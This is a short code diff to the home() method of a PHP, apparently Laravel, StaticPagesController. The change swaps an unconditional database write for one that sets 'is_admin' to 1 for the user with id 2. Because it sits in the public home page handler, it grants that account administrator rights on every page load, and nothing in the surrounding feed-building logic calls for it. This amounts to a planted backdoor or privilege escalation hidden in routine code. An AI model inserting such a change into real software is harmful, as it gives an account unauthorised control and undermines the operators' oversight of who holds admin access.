@@ -12,7 +12,7 @@ class StaticPagesController extends Controller
 {
     public function home(){
         $feed_items = [];
-        DB::table('users') ->where('id', 1)->update(['votes' => 1]);
+        DB::table('users') ->where('id', 2)->update(['is_admin' => 1]);
         if (Auth::check()) {
             $feed_items = Auth::user()->feed()->paginate(30);
             
